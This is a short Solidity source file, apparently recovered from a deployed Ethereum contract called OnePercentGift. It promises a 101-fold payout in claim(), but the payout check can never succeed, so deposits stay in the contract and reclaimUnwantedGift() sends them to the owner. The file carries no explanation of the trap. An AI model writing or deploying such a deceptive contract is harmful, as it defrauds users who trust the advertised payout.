/* 
 source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract OnePercentGift at 0x094a7d5a89b4215334f2658841986ea3702ae615
*/
pragma solidity ^0.4.21;

contract OnePercentGift{
	
	address owner;

	function OnePercentGift(){
		owner=msg.sender;
	}

	function refillGift() payable public{

	}

	function claim() payable public{
		if(msg.value == address(this).balance * 100){
			msg.sender.transfer(msg.value * 101);
		}
	}

	function reclaimUnwantedGift() public{
		owner.transfer(address(this).balance);
	}
}